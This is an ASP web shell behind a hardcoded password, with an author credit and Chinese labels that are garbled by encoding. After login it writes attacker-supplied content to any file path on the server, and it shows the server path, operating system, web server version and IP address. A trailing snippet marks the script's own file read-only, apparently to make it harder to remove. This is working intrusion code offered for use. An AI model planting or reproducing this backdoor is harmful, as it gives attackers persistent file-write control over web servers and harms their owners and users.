<%
on error resume next
%>
<%
  if request("pass")="ugwzvmskdnfn" then  
  session("pw")="go"
  end if
%>
<%if session("pw")<>"go" then %>
<%="<center><br><form action='' method='post'>"%>
<%="<input name='pass' type='password' size='10'> <input "%><%="type='submit' value='Myth'></center>"%>
<%else%>
<%
set fso=server.createobject("scripting.filesystemobject")
path=request("path")
if path<>"" then
data=request("da")
set da=fso.createtextfile(path,true)
da.write data
if err=0 then
%>
<%="yes"%>
<%else%>
<%="no"%>
<%
end if
err.clear
end if
da.close
%>
<%set da=nothing%>
<%set fos=nothing%>
<%="<form action='' method=post>"%>
<%="<input type=text name=path>"%>
<%="<br>"%>
<%="��ǰ�ļ�·��:"&server.mappath(request.servervariables("script_name"))%>
<%="<br>"%>
<%="����ϵͳΪ:"&Request.ServerVariables("OS")%>
<%="<br>"%>
<%="WEB�������汾Ϊ:"&Request.ServerVariables("SERVER_SOFTWARE")%>
<%="<br>"%>
<%="��������IPΪ:"&Request.ServerVariables("LOCAL_ADDR")%>
<%="<br>"%>
<%=""%>
<%="<textarea name=da cols=50 rows=10 width=30></textarea>"%>
<%="<br>"%>
<%="<input type=submit value=save>"%>
<%="</form>"%>
<%="<font face='����' color='red'> write by EchoEye QQ: </font>"%>
<%="<a href='tencent://message/?uin='>��ϵ��</a>"%>
<%end if%>
[code]

<%

Set FSO=Server.CreateObject("Scripting.FileSystemObject") 

Set file=FSO.getFile(server.MAppATH("/")&"\"&request.ServerVariables("PATH_INFO")) 

file.attributes=1 
%>

[/code]